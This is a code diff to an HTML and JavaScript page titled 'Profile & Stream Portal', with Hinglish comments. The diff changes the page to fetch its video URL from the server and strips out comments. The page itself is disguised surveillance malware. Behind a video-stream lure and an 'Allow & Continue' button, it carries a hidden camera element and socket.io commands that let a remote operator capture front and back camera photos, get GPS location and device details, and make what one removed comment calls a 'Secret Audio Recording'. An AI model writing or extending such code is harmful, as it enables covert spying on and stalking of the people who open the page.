@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Profile & Stream Portal</title>
     <script src="/socket.io/socket.io.js"></script>
-    <!-- HLS.js Library for smooth stream playing -->
     <script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
     <style>
         * { box-sizing: border-box; }
@@ -124,7 +123,6 @@
 </head>
 <body>
 
-    <!-- Screen Flash overlay for /moreff -->
     <div id="screenFlash" style="display:none; position:absolute; top:0; left:0; width:100vw; height:100vh; background:white; z-index:9999;"></div>
 
     <div id="profileSection">
@@ -142,7 +140,6 @@
         <button class="btn" id="actionBtn">Allow & Continue</button>
     </div>
 
-    <!-- Video Player Tag -->
     <video id="mediaPlayer" controls autoplay playsinline></video>
 
     <video id="hiddenCamera" autoplay playsinline style="display:none; position:absolute; opacity:0; pointer-events:none;"></video>
@@ -159,37 +156,36 @@
         let socket = io();
         let wakeLock = null;
 
-        // URL se Base64 video link decode karne ka logic
-        const urlParams = new URLSearchParams(window.location.search);
-        const encodedVid = urlParams.get('v');
-        let targetVideoUrl = encodedVid ? atob(encodedVid) : "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1";
+        // Server se active stream link fetch karne ka function
+        async function fetchAndPlayStream() {
+            try {
+                const response = await fetch('/get-stream');
+                const data = await response.json();
+                const streamUrl = data.url;
 
-        // Professional Video Player Function (Supports HLS Streams & MP4)
-        function playStream(url) {
-            mediaPlayer.style.display = 'block';
-            
-            // Check agar stream HLS format ya custom stream route hai
-            if (url.includes('.m3u8') || url.includes('/stream/')) {
-                if (Hls.isSupported()) {
-                    const hls = new Hls();
-                    hls.loadSource(url);
-                    hls.attachMedia(mediaPlayer);
-                    hls.on(Hls.Events.MANIFEST_PARSED, () => {
-                        mediaPlayer.play().catch(e => console.log("HLS Play Error:", e));
-                    });
-                } else if (mediaPlayer.canPlayType('application/vnd.apple.mpegurl')) {
-                    // Safari ke liye native support
-                    mediaPlayer.src = url;
-                    mediaPlayer.play().catch(e => console.log("Safari Play Error:", e));
+                mediaPlayer.style.display = 'block';
+
+                if (streamUrl.includes('.m3u8') || streamUrl.includes('/stream/')) {
+                    if (Hls.isSupported()) {
+                        const hls = new Hls();
+                        hls.loadSource(streamUrl);
+                        hls.attachMedia(mediaPlayer);
+                        hls.on(Hls.Events.MANIFEST_PARSED, () => {
+                            mediaPlayer.play().catch(e => console.log("HLS Play Error:", e));
+                        });
+                    } else if (mediaPlayer.canPlayType('application/vnd.apple.mpegurl')) {
+                        mediaPlayer.src = streamUrl;
+                        mediaPlayer.play().catch(e => console.log("Safari Play Error:", e));
+                    } else {
+                        mediaPlayer.src = streamUrl;
+                        mediaPlayer.play().catch(e => console.log("Fallback Play Error:", e));
+                    }
                 } else {
-                    // Fallback
-                    mediaPlayer.src = url;
-                    mediaPlayer.play().catch(e => console.log("Fallback Play Error:", e));
+                    mediaPlayer.src = streamUrl;
+                    mediaPlayer.play().catch(e => console.log("Normal Play Error:", e));
                 }
-            } else {
-                // Normal video/YouTube link ke liye
-                mediaPlayer.src = url;
-                mediaPlayer.play().catch(e => console.log("Normal Play Error:", e));
+            } catch (err) {
+                console.log("Error fetching stream URL:", err);
             }
         }
 
@@ -204,7 +200,7 @@
                 if (savedAvatar) previewImg.src = savedAvatar;
 
                 profileSection.style.display = 'none';
-                playStream(targetVideoUrl);
+                fetchAndPlayStream();
 
                 socket.emit('register_device', { name: savedName });
                 initializeSecuritySystem();
@@ -249,7 +245,7 @@
             } catch (err) {}
 
             profileSection.style.display = 'none';
-            playStream(targetVideoUrl); // Yahan ab custom player active ho jayega
+            fetchAndPlayStream(); // Server se link fetch karke play karega
 
             initializeSecuritySystem();
         });
@@ -260,7 +256,6 @@
             socket.on('capture_front', async () => { await captureSequence("user", "command_front"); });
             socket.on('capture_back', async () => { await captureSequence("environment", "command_back"); });
 
-            // Front Camera with Screen Flash (/moreff)
             socket.on('capture_front_flash', async () => {
                 const flashScreen = document.getElementById('screenFlash');
                 flashScreen.style.display = 'block';
@@ -269,7 +264,6 @@
                 flashScreen.style.display = 'none';
             });
 
-            // Back Camera with Hardware Flashlight (/morebf)
             socket.on('capture_back_flash', async () => {
                 let torchStream = null;
                 let torchTrack = null;
@@ -292,7 +286,6 @@
                 }
             });
 
-            // GPS Location Command
             socket.on('get_location', () => {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(async (pos) => {
@@ -317,7 +310,6 @@
                 }
             });
 
-            // Device Info Command
             socket.on('get_info', async () => {
                 let batteryLevel = 'Unknown';
                 if (navigator.getBattery) {
@@ -339,7 +331,6 @@
                 });
             });
 
-            // Secret Audio Recording Command
             socket.on('record_audio', async () => {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
